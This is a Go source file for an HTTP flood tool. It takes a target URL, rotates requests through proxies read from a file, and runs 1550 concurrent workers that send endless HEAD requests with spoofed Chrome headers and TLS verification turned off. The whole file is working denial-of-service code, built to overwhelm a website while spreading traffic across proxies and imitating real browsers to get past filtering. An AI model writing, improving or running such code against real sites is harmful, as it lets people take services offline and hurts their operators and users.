package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
)

const (
	workers        = 1550
	requestTimeout = 3 * time.Second
	userAgent      = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)

func init() {
	runtime.GOMAXPROCS(runtime.NumCPU())
}

func main() {
	if len(os.Args) < 2 {
		os.Exit(1)
	}
	targetURL := os.Args[1]

	var proxyURLs []*url.URL
	file, err := os.Open("proxy.txt")
	if err == nil {
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" {
				continue
			}
			if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
				line = "http://" + line
			}
			if p, err := url.Parse(line); err == nil {
				proxyURLs = append(proxyURLs, p)
			}
		}
	}

	if len(proxyURLs) == 0 {
		proxyURLs = append(proxyURLs, nil)
	}

	clients := make([]*http.Client, len(proxyURLs))
	for i, proxyURL := range proxyURLs {
		transport := &http.Transport{
			DialContext: (&net.Dialer{
				Timeout:   2 * time.Second,
				KeepAlive: 30 * time.Second,
			}).DialContext,
			DisableKeepAlives:   false,
			MaxIdleConns:        10000,
			MaxIdleConnsPerHost: 5000,
			MaxConnsPerHost:     0,
			IdleConnTimeout:     60 * time.Second,
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
				MinVersion:         tls.VersionTLS13,
				MaxVersion:         tls.VersionTLS13,
				NextProtos:         []string{"h2"},
			},
			ForceAttemptHTTP2:     true,
			DisableCompression:    true,
			TLSHandshakeTimeout:   1 * time.Second,
			ResponseHeaderTimeout: 1 * time.Second,
			ExpectContinueTimeout: 0,
		}

		if proxyURL != nil {
			transport.Proxy = http.ProxyURL(proxyURL)
		}

		clients[i] = &http.Client{
			Transport: transport,
			Timeout:   requestTimeout,
		}
	}

	ctx, cancel := context.WithCancel(context.Background())
	var wg sync.WaitGroup

	for i := 0; i < workers; i++ {
		wg.Add(1)
		cl := clients[i%len(clients)]
		go func(c *http.Client) {
			defer wg.Done()
			for ctx.Err() == nil {
				req, _ := http.NewRequest("HEAD", targetURL, nil)
				req.Header.Set("User-Agent", userAgent)
				req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
				req.Header.Set("Accept-Language", "en-US,en;q=0.9")
				req.Header.Set("Accept-Encoding", "gzip, deflate, br")
				req.Header.Set("Connection", "keep-alive")
				req.Header.Set("Upgrade-Insecure-Requests", "1")
				req.Header.Set("Sec-Fetch-Dest", "document")
				req.Header.Set("Sec-Fetch-Mode", "navigate")
				req.Header.Set("Sec-Fetch-Site", "none")
				req.Header.Set("Sec-Fetch-User", "?1")
				req.Header.Set("Cache-Control", "max-age=0")

				resp, err := c.Do(req)
				if err == nil {
					resp.Body.Close()
				}
			}
		}(cl)
	}

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	<-sigChan
	cancel()
	wg.Wait()
}
